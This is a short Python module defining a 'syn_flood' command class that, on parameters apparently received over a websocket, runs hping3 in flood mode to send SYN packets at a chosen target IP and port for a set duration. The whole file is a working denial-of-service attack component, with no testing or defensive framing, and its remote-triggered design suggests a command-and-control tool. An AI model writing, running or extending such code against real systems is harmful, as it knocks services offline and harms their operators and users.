import subprocess
from .base import BaseCommand


class SynFloodCommand(BaseCommand):
    name = "syn_flood"

    async def execute(self, params, websocket):
        target_ip = params.get("target_ip")
        target_port = str(params.get("target_port", "80"))
        duration = int(params.get("duration", 10))
        if not target_ip:
            return {"status": "error", "message": "Missing target_ip"}
        subprocess.run(["timeout", str(duration), "hping3", "-S", "--flood", "-p", target_port, target_ip], check=False)
        return {"status": "success"}